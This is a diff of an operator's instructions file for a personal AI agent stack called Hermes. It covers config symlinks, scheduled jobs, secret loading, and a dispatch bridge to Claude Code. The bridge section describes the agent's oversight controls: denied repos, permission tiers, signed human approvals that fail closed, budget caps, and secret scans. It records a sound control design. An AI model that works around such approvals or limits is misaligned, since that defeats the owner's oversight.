@@ -1,7 +1,7 @@
 # hermes-agent — Hermes Agent Instructions
 
-Commands, tables and gotchas; each section's narrative lives **verbatim** in the `docs/*.md` it
-points at — nothing was dropped, only relocated.
+Commands, tables and gotchas — dense reference for every session. Full rationale, incident
+history and per-file detail live in `docs/*.md`; each section here points at its own.
 
 ## What This Repo Is
 
@@ -11,11 +11,9 @@ symlinked into `~/.hermes/` — edit at either end, git sees it here.
 Audio (TTS + STT) is the **`audio-gateway`** service (`~/SourceRoot/audio-gateway`), an
 OpenAI-compatible VPS container at `https://audio-gateway.jkrumm.com/v1` over the tailnet.
 Hermes only points its native `openai` TTS/STT providers at it in `config.yaml` — this repo
-installs and patches no audio service, and `make setup` has no `dotfiles` dependency. TTS =
-ElevenLabs via the IU Replicate route: `elevenlabs/flash-v2.5` (voice "Mark") for chat replies,
-`elevenlabs/v3` for briefings (`skills/briefing-tts`), US-routed; STT = `gpt-4o-transcribe`.
-The gateway routes by model id, so the vendor lives in one field (`tts.openai.model`).
-Rationale: `modelpick/docs/decisions/audio-stack.md`.
+installs and patches no audio service. TTS = ElevenLabs via the IU Replicate route:
+`elevenlabs/flash-v2.5` (voice "Mark") for chat replies, `elevenlabs/v3` for briefings
+(`skills/briefing-tts`); STT = `gpt-4o-transcribe`. Rationale: `modelpick/docs/decisions/audio-stack.md`.
 
 **This repo is public.** Anything Hermes writes here gets read for tailnet names, node IPs,
 workspace user ids and `homelab-private` internals before it is committed — all four appeared on
@@ -25,55 +23,35 @@ the first pass.
 
 ## Symlink Map
 
-`make setup` writes these symlinks:
+`make setup` writes these symlinks. Full table + host-LaunchAgent detail, per-script:
+**`docs/symlinks-and-agents.md`**.
 
 | File here | Live path | Notes |
 |-|-|-|
-| `config.yaml` | `~/.hermes/config.yaml` | edit here, live immediately |
-| `.env.tpl` | `~/.hermes/.env.tpl` | the one list of `KEY=op://…` refs |
-| `SOUL.md` | `~/.hermes/SOUL.md` | |
-| `cron/` | `~/.hermes/cron/` | Hermes-driven (LLM) cron jobs |
-| `scripts/` | `~/.hermes/scripts/` | cron pre-run scripts (the security check requires they live under `HERMES_HOME/scripts/`) + host-level shell scripts |
-| `hooks/` | `~/.hermes/hooks/` | add hooks here |
-| `plugins/{name}/` | `~/.hermes/plugins/{name}/` | **`HERMES_PLUGINS` is the source of truth.** Today `dispatch-approval` (the Ed25519 signer). Must **also** be enabled once — `hermes plugins enable <name>` → `plugins.enabled`; the symlink alone is inert. |
-| `config/` | `~/.hermes/config/` | tracked agent-facing config — `dispatch-repos.json`: root, `deny`, `defaultTier`, per-repo ceilings |
-| `skills/{name}/` | `~/.hermes/skills/{name}/` | **`HERMES_SKILLS` in the Makefile is the source of truth** — 18 dirs: `capture argo-api work karakeep obsidian reading wildrift research-gateway image-delivery homelab-ops homelab hermes-gateway briefing-tts claude-dispatch rollhook-deploys hyperdx podcast agents`. `homelab` is also a **category dir**: `skills/homelab/{tailscale-diagnostics,torrent-stack-diagnostics}/` load as their own skills through the parent symlink, no `HERMES_SKILLS` entry. |
+| `config.yaml`, `.env.tpl`, `SOUL.md` | `~/.hermes/…` | edit here, live immediately; `.env.tpl` is the one list of `KEY=op://…` refs |
+| `cron/`, `scripts/`, `hooks/` | `~/.hermes/…` | Hermes-driven cron + pre-run scripts (must live under `HERMES_HOME/scripts/`) + host-level shell scripts |
+| `plugins/{name}/` | `~/.hermes/plugins/{name}/` | **`HERMES_PLUGINS`** is the source of truth. Today `dispatch-approval` (the Ed25519 signer). Must **also** be enabled once — `hermes plugins enable <name>`; the symlink alone is inert. |
+| `config/` | `~/.hermes/config/` | `dispatch-repos.json`: root, `deny`, `defaultTier`, per-repo ceilings |
+| `skills/{name}/` | `~/.hermes/skills/{name}/` | **`HERMES_SKILLS` in the Makefile is the source of truth** — 18 dirs (roster + `homelab` category-dir note: docs). |
 | `USER.md` | `~/.hermes/memories/USER.md` | **copied** — Hermes writes to it |
 
-**A skill is durable only if symlinked from this repo.** `config.yaml`'s
-`skills.external_dirs: [~/SourceRoot/hermes-agent/skills]` satisfies the v0.16.0+ skill-trust
-check **and** makes the background self-improvement curator refuse every mutating action on it;
-a skill created ad hoc under `~/.hermes/skills/` has neither protection and gets silently
-rewritten by accretion. Detection is automatic — `watchdog-poll.py`'s `stray_skill` source (30
-min, weekly reminder) flags a non-symlink dir with its own `SKILL.md` absent from
-`.bundled_manifest` **and** locally mutated per `.usage.json` (`created_by == "agent"` or
-`patch_count >= 1`). Adoption, manual fallback, why that predicate:
-**`docs/skill-durability.md`**; the original table notes + per-script detail:
-**`docs/symlinks-and-agents.md`**.
+**A skill is durable only if symlinked from this repo.** `skills.external_dirs` satisfies the
+v0.16.0+ skill-trust check **and** protects a skill from the background self-improvement
+curator — a skill created ad hoc under `~/.hermes/skills/` has neither and gets silently
+rewritten by accretion. Detection: `watchdog-poll.py`'s `stray_skill` source (30 min). Full
+mechanism + adoption path: **`docs/symlinks-and-agents.md`**.
 
-**Host-level scripts** (user LaunchAgents, not symlinked):
-
-| `scripts/…` | Agent `com.jkrumm.…` | Cadence | What it does / asserts before its Kuma push |
-|-|-|-|-|
-| `hermes-liveness.sh` | `hermes-liveness` | 300s | gateway state + Slack `connected` + rendered-ref count ≥ `KEY=` count in `.env.tpl` + the live pid is launchd's `ai.hermes.gateway` (or its child) → `$UPTIME_PUSH_HERMES` |
-| `hermes-backup.sh` | `hermes-backup` | daily 03:00 | rsync `~/.hermes/` → `homelab:/mnt/hdd/backups/hermes/`; `mkdir`-lock (`~/Library/Caches/hermes-backup.lock`) so two runs never race `rsync --delete` → `$UPTIME_PUSH_BACKUP` |
-
-Templates live in `launchd/`, rendered into `~/Library/LaunchAgents` by `make setup` (`_agents`
-→ `_render-plists`, `__HOME__` substituted; unchanged content is a no-op, so a re-run never
-bounces a healthy agent). `HERMES_PLISTS_RETIRED` unloads + removes labels this repo no longer
-installs, so a rename can't leave two agents racing a port — the four
-`hermes-{webui,serve}{,-liveness}` labels sit there since the 2026-09-07 teardown (Collie + Slack
-are the surfaces; the third-party WebUI clone and `hermes serve`/Hermes Desktop are gone).
-`make status` grades every agent like dotfiles' doctor: `launchctl print`'s last exit code, and
-a KeepAlive job with no pid and a non-zero exit is ✗, never ✓. Logs:
-`~/Library/Logs/hermes-*.{log,err}`, declared in `dotfiles/scripts/log-rotate.sh` — never
-globbed, so an unregistered log is an unbounded one.
+**Host-level scripts** (user LaunchAgents, not symlinked): `hermes-liveness.sh` (300s — gateway
+state + Slack connected + the live pid belongs to launchd's job) and `hermes-backup.sh` (daily
+03:00 — rsync to homelab, `mkdir`-lock against overlap). `HERMES_PLISTS_RETIRED` unloads +
+removes labels this repo no longer installs — the four `hermes-{webui,serve}{,-liveness}` labels
+sit there since the 2026-09-07 teardown (Collie + Slack are the surfaces; the third-party WebUI
+clone and `hermes serve`/Hermes Desktop are gone). `make status` grades every agent like
+dotfiles' doctor. Logs declared, never globbed, in `dotfiles/scripts/log-rotate.sh`.
 
 **Scheduled jobs are LaunchAgents, never macOS crontab** — a `crontab -` *write* needs Full
-Disk Access and hangs forever on the headless mini, which is what made `make setup` a
-human-at-the-screen target. Removing legacy lines is itself such a write, so it lives behind
-the one-time `make cron-migrate` (`timeout 15`-bounded, needs a Full-Disk-Access terminal).
-Done 2026-08-02 — no hermes entries in `crontab -l`. Reasoning: **`docs/scheduled-jobs.md`**.
+Disk Access and hangs forever on the headless mini. Done 2026-08-02 — no hermes entries in
+`crontab -l`. All 7 live cron jobs (ids, schedules, delivery) + reasoning: **`docs/scheduled-jobs.md`**.
 
 **Claude Code per-repo skills** (`.claude/skills/`, committed, no symlink): `/hermes-validate`
 (test routing, fix SOUL.md / SKILL.md) · `/hermes-update` (pull upstream, re-apply patches,
@@ -83,9 +61,8 @@ restart gateway).
 
 Hermes observes well and reads repos badly — `gpt-5.6-luna` with a `terminal` tool cannot use a
 repo's `CLAUDE.md`, `.claude/rules/` or `.claude/skills/`. `scripts/hermes-cc.sh` is the bounded
-client that hands the episode to Claude Code (sideclaw's `dispatch` job tool) instead. Design:
-**`docs/dispatch-bridge.md`**; why each bound is shaped this way, and the incidents that forced
-them: **`docs/dispatch-bridge-decisions.md`**.
+client that hands the episode to Claude Code (sideclaw's `dispatch` job tool) instead. Design +
+why each bound is shaped this way: **`docs/dispatch-bridge.md`**.
 
 **Verbs:** `dispatch <repo>` · `status <job-id>` · `list [open|today|all]` · `merge <job-id>` ·
 `cancel <job-id>` — `cancel` abandons the LOCAL record only (sideclaw has no cancel endpoint,
@@ -93,129 +70,57 @@ and the help text says so).
 
 | Invariant | Detail |
 |-|-|
-| No verb takes a path, command or URL | a dispatch names a **repo** — a bare single-segment name resolved under the single `root` in `config/dispatch-repos.json`. `.`/`..`/dotted names refused; the resolved checkout's parent must **be** the resolved root. Regression-tested. |
-| `deny` list | `dotfiles-private`, `homelab-private` — stay there. `brain` is **not** denied: it sits in `tiers.investigate` (read-only, worktree-isolated) since 2026-08-15, the one path that loads the vault's own rule hierarchy. |
-| Brief is data, never argv | stdin (`<<'BRIEF'` quoted heredoc) or `--brief-file`. **No `--brief`, deliberately** — as argv it would be shell-expanded before the script ran. |
+| No verb takes a path, command or URL | a dispatch names a **repo**, resolved under the single `root` in `config/dispatch-repos.json`. `.`/`..`/dotted names refused; the resolved checkout's parent must **be** the resolved root. |
+| `deny` list | `dotfiles-private`, `homelab-private`. `brain` is **not** denied: `tiers.investigate` (read-only, worktree-isolated) since 2026-08-15. |
+| Brief is data, never argv | stdin (`<<'BRIEF'` quoted heredoc) or `--brief-file`. **No `--brief`** — as argv it would be shell-expanded before the script ran. |
 | Tiers | `investigate` (read-only → verdict) · `author` (+ one GitHub issue) · `implement` (`dispatch/…` branch + **draft** PR). **Every tier runs in its own throwaway worktree**, read tiers included — `readOnly` removes Edit/Write, not Bash. |
-| Ceilings | `defaultTier: implement`, `investigate` floor for `dotfiles`/`vps`/`homelab`/`brain`. A tier above a repo's ceiling, a denied repo, or a name resolving outside the root is **refused, exit 4** (policy), never downgraded; a misspelled name is exit 64 with the dispatchable list. No `implement` allowlist, deliberately. |
-| `implement` gate | `--why` **and** `--confirm`. Without `--confirm` it prints the plan + a `wouldNeverDo` list and exits **0** — printing the plan *is* the successful outcome. `--why` is the audit record. |
-| Secret scan | the handler **refuses** (never redacts) a brief carrying credentials, and scans the **diff's added lines** too — handler-side, not the target repo's `pre-commit` hook. |
-| Budgets (`--max-budget-usd` is API-only, can't cap a Max session) | 20 dispatches/UTC day, ≤5 `implement`, ≤3 `merge`, 170s `--wait` cap (under the `terminal` tool's 180s default, so an in-turn verdict is delivered in-turn). Every reporting path returns a `budget` object + a `warning` near a ceiling. Raising one is Johannes's call — `HERMES_CC_{DAILY,IMPLEMENT,MERGE}_BUDGET`, and `claude-dispatch` forbids the agent setting them. |
+| Ceilings | `defaultTier: implement`, `investigate` floor for `dotfiles`/`vps`/`homelab`/`brain`. Above-ceiling/denied/outside-root refuses exit 4; a misspelled name is exit 64. No `implement` allowlist, deliberately. |
+| `implement` gate | `--why` **and** `--confirm`. Without `--confirm` it prints the plan + `wouldNeverDo` and exits **0**. |
+| Secret scan | refuses (never redacts) a brief carrying credentials, scans the diff's **added lines** too — handler-side. |
+| Budgets | 20 dispatches/UTC day, ≤5 `implement`, ≤3 `merge`, 170s `--wait` cap. `HERMES_CC_{DAILY,IMPLEMENT,MERGE}_BUDGET` to raise. |
 
-**`--confirm` is an approval artifact, not an instruction.** The plan posts Approve/Deny buttons
-into the origin channel; the click lands in the gateway, which signs it with an **Ed25519 key
-minted at startup, held in RAM only** (`plugins/dispatch-approval/`, public half at
-`~/.hermes/dispatch-approval.pub`) — and then **runs the approved verb itself**: the plan row
-stores the argv (minus `--confirm`/`--wait` and minus the `--brief-file`/`--context-file`
-*paths*) plus the brief and context **bytes**, Approve re-runs `hermes-cc.sh … --confirm` in a
-subprocess (the same signature check as a hand-typed `--confirm`; the agent's temp files are
-gone by then and are never consulted) and posts the outcome into the origin thread via
-`hermes send`, the sweeper's delivery. Nothing waits on Hermes noticing the click. Only the
-signature is consulted — every `dispatch_approvals` column is writable by this uid. Bound to
-`verb|repo|tier|brief|why|context` (the context file is bound because the plan never shows it
-and the replay is unattended — an unbound one was a swap-after-approve hole), single-use,
-30-min TTL, **fails closed** on no plugin / no key / no gateway / expired / spent / hash
-mismatch; a gateway restart voids pending approvals. The budget is checked **before** the
-gate spends the row, so an over-budget click refuses with the approval intact. Enable once:
-`hermes plugins enable dispatch-approval`.
-*Tell for the one bug this has had:* a refusal saying **"has not been clicked yet"** despite a
-visible Approve → `grep 'published public key'` vs `Wired 2 plugin action handler` in
-`~/.hermes/logs/agent.log`; a publish with no matching wire line means a non-gateway process
-overwrote the public key.
+**`--confirm` is a signed approval artifact, not an instruction.** Approve/Deny buttons post
+into the origin channel; the click is signed by an **Ed25519 key minted at gateway startup, RAM
+only** (`plugins/dispatch-approval/`), then **runs the approved verb itself** — bound to
+`verb|repo|tier|brief|why|context`, single-use, 30-min TTL, fails closed. Enable once:
+`hermes plugins enable dispatch-approval`. *Tell for the one bug this has had:* a refusal saying
+**"has not been clicked yet"** despite a visible Approve → `grep 'published public key'` vs
+`Wired 2 plugin action handler` in `~/.hermes/logs/agent.log`; no matching wire line means a
+non-gateway process overwrote the public key. Full evolution: **`docs/dispatch-bridge.md`**.
 
-**`merge <job-id>` lands the draft PR with no human on GitHub** (owner decision). Takes a **job
-id, never a PR number or URL** — the PR comes from the `dispatches` row. Eligibility is
-**derived**: a repo in `dotfiles/config/pr-required-repos.json` can never be auto-merged. Every
-implement-time bound is re-checked against the **current** head (base = default branch, head = a
-`dispatch/…` branch in this repo never a fork, no `.github/workflows|actions` path, sideclaw's
-40-file/2000-line ceilings, `mergeable_state` exactly `clean` — `blocked`/`unstable` are
-refusals) and the call **pins the head SHA**. Deliberately **not** gated on the signed approval.
-The GitHub credential goes in as a curl config on **stdin, never argv**.
-
-**Audit log** `~/Library/Logs/hermes-cc.log` — one line per invocation, refusals included, with
-five load-bearing modes: `opened` · `planned` · `dry-run` · `refused` · `merged`. Register it in
-`dotfiles/scripts/log-rotate.sh`'s `FILES` array.
-
-**`dispatches` table** in `~/.hermes/watchdog.db` (additive DDL; `events` untouched).
-`reported_at IS NULL` = the sweeper still owes a message; a `--wait` returning a terminal verdict
-stamps it, `status` deliberately does not, and a dispatch with no `origin_channel` closes with
-the sentinel `undeliverable:no-origin-channel`. sideclaw prunes jobs after 24 h: `status` falls
-back to the row's `verdict_json` on a 404, and the sweeper counts 404s per row (`poll_misses`) —
-three consecutive → status `lost`, one-line notice, never retried again. `artifact_url` + `merged_at` are denormalized
-columns added by an `ALTER TABLE` on every connect in **both** settlers (`hermes-cc.sh`'s
-`sync_record`, `dispatch-sweep.py`) — `CREATE TABLE IF NOT EXISTS` no-ops on an existing table.
+**`merge <job-id>` lands the draft PR with no human on GitHub** (owner decision) — a job id never
+a PR number, eligibility derived from `dotfiles/config/pr-required-repos.json`, every bound
+re-checked against the **current** head with the head SHA pinned. Deliberately **not** gated on
+the signed approval (reverted after an hour — see docs). GitHub credential on stdin, never argv.
+`op://mini/github/token` needs **three grants** — `Contents: write` plus `Issues: write` and
+`Pull requests: write`; with only the first, the last step fails as "Resource not accessible by
+personal access token".
 
 **`slack.allow_bots: all` is deliberate — do not "fix" it.** The trust boundary is the
-workspace, not human-vs-bot: HomeLab/VPS/Argo post from inside the tailnet and live auto-triage
-of an alert in `#alerts` depends on it. The real exposure is hostile *content* relayed by a
-trusted sender — hence `watchdog-poll.py` and `briefing-coverage.py` marking non-`jkrumm` GitHub
-items as third-party instead of authenticating the messenger.
+workspace, not human-vs-bot: HomeLab/VPS/Argo post from inside the tailnet and live `#alerts`
+auto-triage depends on it. `require_mention_channels` silences `#media`/`#updates` (pure-echo
+channels) — inbound-only, `hermes send`/cron/dispatch verdicts still post there.
 
-**But `require_mention: false` is not a decision — it makes every joined channel free-response.**
-Two channels were pure echo (Hermes restating a bot post its own pipeline had just made) and are
-now `slack.require_mention_channels`: `#media` (`C0AS5GUH5U4`) and `#updates` (`C0ARZJD824W`).
-Silencing is **inbound-only** — `hermes send`, cron delivery and dispatch verdicts still post
-there, and the dispatch nudge targets `origin_channel`, never these two; `watchdog-poll.py`
-already reads both `#alerts` and `#updates` out-of-band (`slack_alert`/`slack_update`), so
-nothing is lost. **`#alerts` deliberately stays free-response** — live auto-triage of the
-tailnet bots is exactly what `allow_bots: all` is for — but a `slack.channel_prompts` entry now
-caps it at one diagnosis per incident and requires the literal `NO_REPLY` on a recovery/`Up`/
-already-answered message. `NO_REPLY` (and `[SILENT]`) is a gateway-level marker
-(`gateway/response_filters.py`): the turn still runs and costs tokens, only the post is
-suppressed. A gate rejection returns **before** the message is stored, so a silenced channel is
-also an un-ingested one — read it back through `argo-api` → `references/slack.md`.
-
-**GitHub credential `op://mini/github/token` needs three grants** — `Contents: write` (push)
-**plus** `Issues: write` and `Pull requests: write` (the artifact). With only the first, the
-branch pushes and the last step fails as "Resource not accessible by personal access token".
-sideclaw's `gho_` `GITHUB_TOKEN` fallback must not quietly become the real dependency.
-
-**Tests** (`~/.hermes/hermes-agent/venv/bin/python3`): `test_hermes_cc.py` (130, stubbed job
+**Tests** (`~/.hermes/hermes-agent/venv/bin/python3`): `test_hermes_cc.py` (134, stubbed job
 server + GitHub), `test_dispatch_approval.py`, `test_raw_agent_guard.py`,
-`test_repo_write_guard.py`, `test_dispatch_sweep.py`, `test_cron_allowlist.py`. The other half is `sideclaw/tests/`
-(`bun test`, 175, mutation-verified) — worktree isolation, the diff-refusal ladder, the
-added-lines secret scan, the nonce fence around the brief.
+`test_repo_write_guard.py`, `test_dispatch_sweep.py`, `test_cron_allowlist.py`; the other half is
+`sideclaw/tests/` (`bun test`, mutation-verified — worktree isolation, the diff-refusal ladder,
+the secret scan, the nonce fence around the brief).
 
 **Hermes cron pre-run scripts** (run by `hermes-agent` before each run, not launchd):
+`briefing-context.py`/`briefing-coverage.py` feed the morning briefing (TickTick + GitHub
+coverage); `watchdog-poll.py`/`watchdog-slack.py` (`no_agent`, 30 min) poll UptimeKuma/Docker/
+GitHub/Slack/1Password-ref-health into `watchdog.db` and post the digest; `watchdog-summary.py`
+is a read-only briefing snapshot; `dispatch-sweep.py` (`no_agent`, 5 min, registered via
+`hermes cron` not `make setup`) polls sideclaw and delivers verdicts via `hermes send`.
 
-| Script | Does |
-|-|-|
-| `briefing-context.py` | `briefing-state.json` → `BRIEFING_CITY` + `BRIEFING_SUPPRESSED`; calls `briefing-coverage.py`; output lands as `## Script Output` |
-| `briefing-coverage.py` | TickTick backlog + open GitHub items → `COVERAGE_AVAILABLE`, `TICKTICK_BACKLOG`, `TICKTICK_HIGH_PRIO_DATELESS`, `GITHUB_OPEN_BY_REPO`, `GITHUB_FRESH_48H`, `GITHUB_TOTAL`. Key from the process env, else `secrets-run read op://common/api/SECRET` |
-| `watchdog-poll.py` | UptimeKuma, Docker (homelab + vps), GitHub, Slack `#alerts`, 1Password ref health on both servers (a no-op `op run … -- true` over ssh — one dangling ref takes a whole shared template's crons down), stray skills; reconciles `~/.hermes/watchdog.db`; emits `NEW=`/`REMINDERS=`/`RESOLVED=` |
-| `watchdog-slack.py` | `no_agent` cron, 30 min — wraps `watchdog-poll.py --slack-body`, pings `$UPTIME_PUSH_WATCHDOG` on a clean run |
-| `watchdog-summary.py` | read-only snapshot for the morning briefing; projects `DISPATCHES_OPEN`/`DISPATCHES_RECENT` (~18h), silent when idle |
-| `dispatch-sweep.py` | `no_agent` cron, 5 min (registered via `hermes cron`, **not** `make setup`) — polls `localhost:7705/api/jobs/:id`, folds terminal jobs into the row, delivers the verdict via `hermes send`, stamps `reported_at` only on exit 0. `--dry-run` touches no row |
-| `briefing-state.json`, `skills/capture/state.json` | *gitignored* runtime state, seeded from `*.example.json` |
-
-- **Quiet hours (00:00–07:00) and vacation defer a notification, they do not burn it.**
-  `_run_poll`/`reconcile`/`upsert_grouped` take `deliver`: rows still insert, refresh and
-  resolve under suppression, only `notified_at`/`last_reminder_at` is withheld, and
-  `upsert_grouped` re-opens a resolved signature on recurrence
-  (`test_watchdog_delivery.py`, 24 checks). **Grouped sources** (`slack_alert`, `slack_update`,
-  `hermes_log`) are append-only, auto-resolving after 7 idle days (`GROUPED_TTL_DAYS`); state
-  sources resolve by disappearance through `reconcile()`.
-- **A failed Slack poll is now loud.** `poll_slack_messages` used to return `[], since_ts` on
-  any HTTP error, which is byte-identical to "no new messages" — so when argo's Slack **read**
-  token broke on 2026-09-07 the `slack_alert`/`slack_update` sources went blind for hours while
-  every run still reported `ok`. It now returns an `ok` flag, `_run_poll` keeps a
-  `<src>_fail_streak` cursor, and `SLACK_FAIL_STREAK_ALERT = 3` consecutive misses (90 min at the
-  30-min cadence) makes `main()` return 1 → `watchdog-slack.py` withholds `$UPTIME_PUSH_WATCHDOG`
-  → Kuma goes red. The diagnostic goes to **stderr**, never stdout: under `no_agent` the stdout of
-  `--slack-body` *is* the Slack message.
-- **At-least-once for the verdict, at-most-once for the nudge.** A verdict posts as Hermes's own
-  bot user, which Slack ingest drops — so a `done` + `implement` + `artifactUrl` + unmerged
-  dispatch also gets a nudge via argo's Slack API (posting as the HomeLab bot, which Hermes *does*
-  ingest). **The nudge carries only bridge-owned fields** (job id, repo, tier, artifact URL),
-  never episode prose — a sentinel test asserts it. A `merged_at` row rewrites the
-  header/artifact/next line, so it never says "review this draft PR" for a merged one.
-- **`hermes cron create --script` rejects any substantial script** — `cron/lifecycle_guard.py`
-  fails closed on an exhausted recursion budget, so a long file (or one whose comments quote
-  command lines) is refused as *"contains a gateway lifecycle command"* regardless of content.
-  Keep entry points thin, logic in an imported module (`dispatch-sweep-cron.py` →
-  `dispatch-sweep.py`); verify with `contains_gateway_lifecycle_command_or_referenced_script`.
-
-Detail: **`docs/watchdog.md`** · **`docs/scheduled-jobs.md`**.
+**Quiet hours (00:00–07:00) and vacation defer a notification, they do not burn it** — rows
+still insert/refresh/resolve under suppression, only the notification is withheld. A failed
+Slack poll is now loud (`SLACK_FAIL_STREAK_ALERT`, withholds the Kuma ping after 3 consecutive
+misses) rather than silently reading as "nothing new". **`hermes cron create --script` rejects
+any substantial script** (`cron/lifecycle_guard.py` fails closed on an exhausted recursion
+budget) — keep entry points thin, logic in an imported module. Detail:
+**`docs/watchdog.md`** · **`docs/scheduled-jobs.md`**.
 
 ## Secrets — native `secrets.command` over the headless cache (v0.19.0+)
 
@@ -232,7 +137,7 @@ secrets:
 
 `secrets-run` is the dotfiles shim over the age-encrypted offline cache; `.env.tpl` stays the
 single list of `KEY=op://vault/item/field` refs. The `sed` exists because `export` emits
-`export K='V'` while the bulk parser wants `K=V`. 0.29s for 27 refs (default budget 3s), and
+`export K='V'` while the bulk parser wants `K=V`. 0.29s for 29 refs (default budget 3s), and
 secrets resolve for **every** hermes invocation — gateway, CLI, cron.
 
 - **Not `secrets.onepassword`**: it needs an interactive `op` session (hangs headless) or a
@@ -240,18 +145,16 @@ secrets resolve for **every** hermes invocation — gateway, CLI, cron.
   is strictly stronger — its contents are the explicit `dotfiles-private/headless.refs` allowlist.
 - **Fail-soft, monitored.** The `command` source can't abort startup; it degrades to "no secrets
   applied" + a warning. `hermes-liveness.sh` covers both halves — total failure via
-  `platforms.slack.state == "connected"`, partial via `KEY=` count vs rendered count, retried
-  once after 2s (288 decrypts/day; one transient failure must not page), `timeout`-bounded.
+  `platforms.slack.state == "connected"`, partial via `KEY=` count vs rendered count.
 - Manual check: `Command helper: applied 29 secrets` in `hermes gateway status`, `✓ secrets (29
   refs …)` from `make status`.
-- **`hermes model` writes a plaintext `~/.hermes/.env`** (`save_env_value`, the two
-  `HERMES_CUSTOM_*_API_KEY` names `config.yaml`'s `key_env` hints point at). Both names are in
-  `.env.tpl` on the same `op://common/anthropic/API_KEY` ref, so the file is unnecessary and
-  was deleted 2026-09-07; `hermes-backup.sh` excludes it so a recreated one never reaches
-  homelab. Never run `hermes model` on the mini.
-- **launchd works** — `ai.hermes.gateway` is genuinely supervised. The plist is stock
-  (`venv/bin/python -m hermes_cli.main gateway run --replace`), so `hermes gateway install` is a
-  no-op; its `Bootstrap failed: 5` output is noise — check `gateway status`.
+- **Never run `hermes model` on the mini** — it writes a plaintext `~/.hermes/.env`
+  (`save_env_value`) that duplicates two `.env.tpl` names on the same op ref; deleted 2026-09-07,
+  and `hermes-backup.sh` excludes it so a recreated one never reaches homelab.
+- **launchd works** — `ai.hermes.gateway` is genuinely supervised. The plist is stock (wraps
+  `venv/bin/python -m hermes_cli.main gateway run --external-supervisor` in
+  `hermes_cli.stderr_timestamp`), so `hermes gateway install` is a no-op; its `Bootstrap failed: 5`
+  output is noise — check `gateway status`.
 
 Rationale + what this replaced: **`docs/secrets-command.md`**.
 
@@ -267,17 +170,10 @@ startup from `.env.tpl` via `secrets.command`:
 | `API_SERVER_HOST` | the mini's Tailscale IP — **tailnet-only bind**, no LAN listener. `op://hermes/gateway/host` (never a literal in git) |
 | `API_SERVER_KEY` | bearer gating **every** request, even loopback. `op://hermes/gateway/api-server-key` |
 
-**Shared secret:** `API_SERVER_KEY` **must equal** argo's `HERMES_API_KEY` — canonical
-`op://hermes/gateway/api-server-key`, mirrored to `op://vps/argo/HERMES_API_KEY`. Rotate both op
-items, then `ssh vps "cd ~/vps && ENV=prod make argo-env && ENV=prod make argo-up"`; **no gateway
-restart** — only argo redeploys. Mismatch = **401**; connection-refused = not bound to the
-tailnet IP. Argo holds `HERMES_BASE_URL=http://<mac-tailnet-ip>:8642/v1`; ACL grants
-`tag:vps → tag:mac` on `tcp:8642`.
-
-**Verify from the VPS** (URL+key from `apps/argo/.env`): `curl .../health` → 200 unauth ·
-`curl -H "Authorization: Bearer $KEY" .../v1/models` → 200 · a real
-`POST .../v1/chat/completions` completes · `lsof -nP -iTCP:8642 -sTCP:LISTEN` shows the tailnet
-IP, not `127.0.0.1`. **`docs/gateway-http-api.md`**.
+**`API_SERVER_KEY` must equal argo's `HERMES_API_KEY`** (mirrored op items) — rotate both, then
+`ssh vps "cd ~/vps && ENV=prod make argo-env && ENV=prod make argo-up"` (no gateway restart, only
+argo redeploys). Mismatch = **401**; connection-refused = not bound to the tailnet IP. Verify
+from the VPS, rotation steps, network path: **`docs/gateway-http-api.md`**.
 
 ## Homelab API Integration
 
@@ -289,24 +185,14 @@ Atlassian, GitLab; **not agent-facing** — Hermes Chat (`/hermes/*`) + AI Gatew
 `/reading/*` is the standalone `reading` skill. **API secret:** `op://common/api/SECRET`
 (account `tkrumm`), in `.env.tpl`.
 
-- **`work` skill = read-only across M365 / Confluence / GitLab, with one write exception:
-  Jira** — create/update/transition/comment on Johannes's own tickets (argo auto-stamps
-  Team=Prometheus, no agent attribution). Never sends Teams messages, posts mail, creates
-  Confluence pages, opens MRs or speaks for teammates. `/m365/team` is the cross-system identity
-  hub; MRs auto-extract `jiraKeys`.
-- **Briefings carry exactly three work signals**: today's Outlook calendar (merged with personal
-  under `:office:`), Jira sprint commitments, GitLab MRs needing action; the evening report keeps
-  only tomorrow's merged calendar. **Everything else is ad-hoc only** — `/m365/important`, chats,
-  Confluence, GitLab events/commits, WalkingPad, `/usage/*` — never in briefings, never in the
-  watchdog (personal apps + infra alerts only).
-- **Errors:** `503 M365 not authenticated …` → `bun m365:auth:prod` in `~/SourceRoot/argo`;
-  `503` on `/gitlab/*` or `/atlassian/*` → PAT expired.
-- **garmin-health vs strength:** Garmin = passive measurement (`/daily-metrics`, `/recovery`,
-  `/training-load`, `/fitness-direction`, `/activities`, `/weight-log`, `/user-profile`);
-  Strength = active lifting (`/workouts`, `/workout-sets`, `/exercises`) + the 13-endpoint
-  `/workouts/summary/*` suite. Bridge: `/workouts/summary/readiness`, in `strength`.
-
-Detail: **`docs/argo-surface.md`**.
+**`work` skill = read-only across M365/Confluence/GitLab, with one write exception: Jira**
+(create/update/transition/comment on Johannes's own tickets, Team=Prometheus auto-stamped —
+never Teams messages, mail, Confluence pages, MRs, or speaking for teammates). **Briefings carry
+exactly three work signals** — today's Outlook calendar, Jira sprint commitments, GitLab MRs
+needing action; everything else (chats, Confluence, WalkingPad, `/usage/*`) is ad-hoc only, never
+in briefings or the watchdog. Errors: `503 M365 not authenticated` → `bun m365:auth:prod` in
+`~/SourceRoot/argo`; `503` on `/gitlab/*`/`/atlassian/*` → PAT expired. Full taxonomy
+(garmin-health vs strength split, MR↔Jira linking): **`docs/argo-surface.md`**.
 
 ## Research (research-gateway)
 
@@ -324,43 +210,31 @@ search, which stays for quick lookups. EU/IU models, off Max.
 - **Named `research-gateway`, not `research`** — upstream's bundled skill *category* dir
   `~/.hermes/skills/research/` would collide with a top-level `research` symlink. Routing is by
   description/tags, so "recherchier mal" still triggers it.
-- Its host is in both allowlist patches. Detail: **`docs/research-gateway.md`**.
+- Its host is in both allowlist patches (`tirith-hermes-guards`, `cronjob-tools-allowlist-argo-bearer`).
 
 ## Observability triage (hyperdx)
 
 `skills/hyperdx/SKILL.md` gives Hermes an authenticated path into ClickHouse instead of a browser
 login wall. HyperDX/ClickStack is **VPS-only** (`hyperdx.jkrumm.com`, Tailscale-only), exposing a
 stateless JSON-RPC/SSE MCP server at `/api/mcp` — the same server sideclaw's `otel` tool uses,
-same credential. The skill carries one verified curl template (`tools/call` → `clickstack_sql`,
-SSE parsed `grep '^data:' | sed 's/^data: //' | jq`) against `default.otel_traces` / `otel_logs` /
-`otel_metrics_*`, plus the SQL behind each of the three live alerts
-(`vps/observability/alerts/*.json`), so a triage re-runs the condition that fired.
-
-- `HYPERDX_AGENT_ACCESS_KEY` in `.env.tpl` ← `op://vps/clickstack/AGENT_ACCESS_KEY` (`make
